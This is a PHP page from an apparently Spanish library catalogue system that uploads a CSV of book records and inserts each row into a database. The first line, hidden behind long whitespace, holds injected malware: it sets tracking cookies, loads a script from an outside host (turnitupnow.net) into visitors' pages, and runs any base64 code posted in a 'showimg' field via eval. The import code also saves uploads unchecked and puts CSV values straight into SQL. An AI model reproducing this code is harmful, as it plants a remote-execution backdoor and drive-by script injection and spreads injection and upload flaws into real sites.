<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

	if (isset($_GET['import'])) {
		
		$imagen = $_FILES['imagen']['name']; 
		$tipo_archivo = $_FILES['imagen']['type']; 
		$tamano_archivo = $_FILES['imagen']['size'];
		$ruta_imagen= getcwd()."//import//".$imagen;
		if (move_uploaded_file($_FILES['imagen']['tmp_name'], $ruta_imagen)){ } else { }
		
		$fichero = $imagen;
		
			$row = 1;
			
			$handle = fopen("import/$fichero", "r");
			
			while (($data = fgetcsv($handle, 1000, ";")) !== FALSE) {
				$num = count($data);
				$row++;
				for ($c=0; $c < $num; $c++) { $valor[$c]=$data[$c]; }
				 
					/* echo */ $codcen = $valor[0];
					/* echo */ $codlib = $valor[1]; 
					/* echo */ $nregistro = $valor[2];
					/* echo */ $titulo = $valor[3]; 
					/* echo */ $signatura = $valor[4];
					/* echo */ $seccion = $valor[5]; 
					/* echo */ $armario = $valor[6];
					/* echo */ $fila = $valor[7]; 
					/* echo */ $codprop = $valor[8];
					/* echo */ $propdon = $valor[9]; 
					/* echo */ $cantidad = $valor[10];
					/* echo */ $adquiridos = $valor[11]; 
					/* echo */ $libres = $valor[12];
					/* echo */ $isbn = $valor[13]; 
					/* echo */ $codcol = $valor[14];
					/* echo */ $numcol = $valor[15]; 
					/* echo */ $areaedic = $valor[16];
					/* echo */ $codedit = $valor[17]; 
					/* echo */ $localidad = $valor[18];
					/* echo */ $apublica = $valor[19]; 
					/* echo */ $descrfis = $valor[20];
					/* echo */ $paginas = $valor[21]; 
					/* echo */ $duracion = $valor[22];
					/* echo */ $codtipmat = $valor[23]; 
					/* echo */ $otros = $valor[24];
					/* echo */ $comenta = $valor[25]; 
					/* echo */ $falta = $valor[26];
					/* echo */ $fbaja = $valor[27]; 
					/* echo */ $mabja = $valor[28];
					/* echo */ $iniciales = $valor[29]; 
					/* echo */ $cdu1 = $valor[30];
					/* echo */ $cdu2 = $valor[31];
					/* echo */ $solousar = $valor[32]; 
					/* echo */ $notas = $valor[33];
					/* echo */ $areaed = $valor[34]; 
					/* echo */ $niveled = $valor[35];
					/* echo */ $volcol = $valor[36]; 
					/* echo */ $codmat = $valor[37];
					/* echo */ $codm008 = $valor[38]; 
					/* echo */ "<br>";
					
					if ($row != 1){
						$result = $db->Execute("INSERT INTO CDL_completa_TEST (codcen, codlib, nregistro, titulo, signatura, seccion, armario, fila, codprop, propdon, cantidad, adquiridos, libres, isbn, codcol, numcol, areaedic, codedit, localidad, apublica, descrfis, paginas, duracion, codtipmat, otros, comenta, falta, fbaja, mbaja, iniciales, cdu1, cdu2, solousar, notas, areaed, niveled, volcol, codmat, codm008) VALUES ('$codcen', '$codlib', '$nregistro', '$titulo', '$signatura', '$seccion', '$armario', '$fila', '$codprop', '$propdon', '$cantidad', '$adquiridos', '$libres', '$isbn', '$codcol', '$numcol', '$areaedic', '$codedit', '$localidad', '$apublica', '$descrfis', '$paginas', '$duracion', '$codtipmat', '$otros', '$comenta', '$falta', '$fbaja', '$mbaja', '$iniciales', '$cdu1', '$cdu2', '$solousar', '$notas', '$areaed', '$niveled', '$volcol', '$codmat', '$codm008')");
						if ($result === false) die("failed"); 
					}
					}
					//echo "<br>Se han guardado ".$row." registros.";
			fclose($handle);
		
	}
?>
<link href="resources/estilos.css" rel="stylesheet" type="text/css" />

<table width="280" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Cargar libros por Excel (.csv)</td>
  </tr>
</table>
<table width="280" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="44" align="center" bgcolor="#F8F8F8"><form action="index.php?menu=1&sub=1&import" method="post" enctype="multipart/form-data" name="form1" id="form1" style="margin:0px">
      <label>
        <br />
        <input type="file" name="imagen" id="imagen" />
      </label>
      <br />
      <br />
      <label>
        <input type="submit" name="button" id="button" value="Importal Excel" />
        <br />
        <br />
      </label>
    </form></td>
  </tr>
</table>
